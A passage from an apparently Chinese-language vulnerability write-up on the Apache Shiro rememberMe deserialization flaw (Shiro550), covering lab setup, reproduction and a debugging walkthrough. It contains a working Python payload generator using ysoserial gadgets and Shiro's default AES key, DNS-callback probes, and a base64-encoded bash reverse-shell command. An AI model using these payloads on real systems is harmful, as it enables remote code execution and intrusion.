class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-toolchains-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>toolchain<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">toolchains</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">jdk</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">toolchains</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">forkMode</span>&gt;</span>never<span class="tag">&lt;/<span class="name">forkMode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jetty-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">implementation</span>=<span class="string">"org.mortbay.jetty.nio.SelectChannelConnector"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">port</span>&gt;</span>9080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">maxIdleTime</span>&gt;</span>60000<span class="tag">&lt;/<span class="name">maxIdleTime</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">requestLog</span> <span class="attr">implementation</span>=<span class="string">"org.mortbay.jetty.NCSARequestLog"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filename</span>&gt;</span>./target/yyyy_mm_dd.request.log<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">retainDays</span>&gt;</span>90<span class="tag">&lt;/<span class="name">retainDays</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">append</span>&gt;</span>true<span class="tag">&lt;/<span class="name">append</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">extended</span>&gt;</span>false<span class="tag">&lt;/<span class="name">extended</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">logTimeZone</span>&gt;</span>GMT<span class="tag">&lt;/<span class="name">logTimeZone</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">requestLog</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sourceforge.htmlunit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>htmlunit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-2.1-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着配置Tomcat服务器：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/8.png" alt=""></p><p>之后运行就OK了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Shiro特征探测，在登录接口的响应报文中Set-Cookie头字段存在rememberMe，可以针对此类型接口进行PoC盲打：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/4.png" alt=""></p><h4 id="漏洞探测1"><a href="#漏洞探测1" class="headerlink" title="漏洞探测1"></a>漏洞探测1</h4><p>shiro_poc.py，基于ysoserial工具生成基于CommonsBeanutils1的反序列化利用payload，然后使用Shiro默认Key来进行AES和Base64相关加密操作，最后输出完整rememberMe的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-master-6eca5bc740-1.jar'</span>, <span class="string">'CommonsBeanutils1'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br><span class="line">    <span class="comment"># with open("payload.txt", "w") as fpw:</span></span><br><span class="line">    <span class="comment">#     print("rememberMe=&#123;&#125;".format(payload.decode()), file=fpw)</span></span><br></pre></td></tr></table></figure><p>生成探测类的PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_poc.py &quot;ping xxx.ceye.io&quot;</span><br></pre></td></tr></table></figure><p>直接将上述命令输出的payload放到Cookie中打过去，任意接口都OK：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/2.png" alt=""></p><p>ceye中看到DNS查询记录就验证存在rememberMe反序列化漏洞：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/3.png" alt=""></p><h4 id="漏洞探测2"><a href="#漏洞探测2" class="headerlink" title="漏洞探测2"></a>漏洞探测2</h4><p>当然，通用的反序列化探测类PoC为URLDNS这个Gadget，这是因为URLDNS类无需其他依赖、就存在于JDK环境中，其已集成在ysoserial中，我们直接用就可以了，使其指向DNSLOG：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://oup399.dnslog.cn&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure><p>Java写的用于生成payload，和前面的shiro_poc.py原理一样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="string">"E:\\xxx\\poc.ser"</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.println(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到payload，放到Cookie的rememberMe中打过去：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/19.png" alt=""></p><p>此时DNSLOG收到请求即可验证存在漏洞：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/20.png" alt=""></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>后续利用只需将执行的命令改为反弹shell的bash命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_poc.py &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMC4xLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/5.png" alt=""></p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/6.png" alt=""></p><p>最终测试的shiro_poc.py脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'URLDNS', command], stdout=subprocess.PIPE)</span></span><br><span class="line">    <span class="comment"># popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)</span></span><br><span class="line">    <span class="comment"># popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-6eca5bc740-1.jar', 'CommonsCollections5', command], stdout=subprocess.PIPE)</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-master-6eca5bc740-1.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># URLDNS</span></span><br><span class="line">    <span class="comment"># payload = encode_rememberme('http://shiro.k7b1ft.dnslog.cn')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># CommonsBeanutils1</span></span><br><span class="line">    <span class="comment"># payload = encode_rememberme('ping cb1.k7b1ft.dnslog.cn')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># CommonsCollections5/6/7</span></span><br><span class="line">    <span class="comment"># payload = encode_rememberme('ping cc5.k7b1ft.dnslog.cn')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># JRMP</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">'172.21.0.1:1234'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br><span class="line">    <span class="comment"># with open("payload.txt", "w") as fpw:</span></span><br><span class="line">    <span class="comment">#     print("rememberMe=&#123;&#125;".format(payload.decode()), file=fpw)</span></span><br></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在本地搭建的Apache Shiro Quickstart环境中，我们在看Shiro源码的时候，看到一个名为CookieRememberMeManager的类，顾名思义就是Cookie rememberMe的管理类，直接在org/apache/shiro/web/mgt/CookieRememberMeManager类的getRememberedSerializedIdentity()函数中打上断点开始调试。</p><p>用URLDNS的payload打过去，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">getRememberedSerializedIdentity:187, CookieRememberMeManager (org.apache.shiro.web.mgt)</span><br><span class="line">getRememberedPrincipals:393, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:690, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:615, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:818, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1627, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在getRememberedSerializedIdentity()函数中，调用getCookie()函数获取到cookie头字段，然后调用readValue()函数获取到cookie中的rememberMe对应的值即恶意构造的payload：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/9.png" alt=""></p><p>接着，是对这段base64字符串进行Base64解码并返回：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/10.png" alt=""></p><p>往下，返回到了父类org/apache/shiro/mgt/AbstractRememberMeManager的getRememberedPrincipals()函数中，其中对返回的字节数组通过调用convertBytesToPrincipals()函数来进行一个转换的操作：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/11.png" 